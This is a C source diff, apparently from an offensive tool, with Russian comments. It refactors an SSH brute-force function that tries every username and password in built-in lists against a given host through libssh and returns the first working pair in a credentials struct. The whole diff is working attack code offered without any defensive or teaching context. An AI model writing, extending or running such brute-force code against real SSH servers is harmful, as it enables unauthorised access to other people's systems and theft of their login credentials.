@@ -1,5 +1,11 @@
 #include "include/includes.h"
 
+typedef struct {
+    char username[128];
+    char password[128];
+    int good;
+} Credentials;
+
 int try_login(const char *host, const char *user, const char *password) {
     ssh_session session = ssh_new();
     if (session == NULL) {
@@ -32,24 +38,28 @@ int try_login(const char *host, const char *user, const char *password) {
     }
 }
 
+Credentials ssh_brute(char *host) {
+    Credentials credentials = { .username = "", .password = "", .good = 0 }; // Инициализация пустыми строками
+    int shutup_ssh_bruteforce = 0;
 
-
-int ssh_brute() {
-    int shutup_ssh_bruteforce;
-
-    for (int b = 0; usernames[b] != NULL; b++){
+    for (int b = 0; usernames[b] != NULL; b++) {
         for (int i = 0; passwords[i] != NULL; i++) {
-            if (try_login(SSH_HOST, usernames[b], passwords[i]) == 0) {
+            if (try_login(host, usernames[b], passwords[i]) == 0) {
+                // Если пароль найден, сохраняем учетные данные
+                strncpy(credentials.username, usernames[b], sizeof(credentials.username) - 1);
+                strncpy(credentials.password, passwords[i], sizeof(credentials.password) - 1);
+                credentials.username[sizeof(credentials.username) - 1] = '\0'; // Обеспечиваем нуль-терминацию
+                credentials.password[sizeof(credentials.password) - 1] = '\0'; // Обеспечиваем нуль-терминацию
+                credentials.good = 1;
                 shutup_ssh_bruteforce = 20;
                 break; // Если пароль найден, выходим из цикла
             }
         }
 
         if (shutup_ssh_bruteforce == 20) {
-            shutup_ssh_bruteforce = 0;
-            break;
+            break; // Выходим из внешнего цикла, если пароль найден
         }
-
     }
-    return 0;
+
+    return credentials; // Возвращаем найденные учетные данные
 }
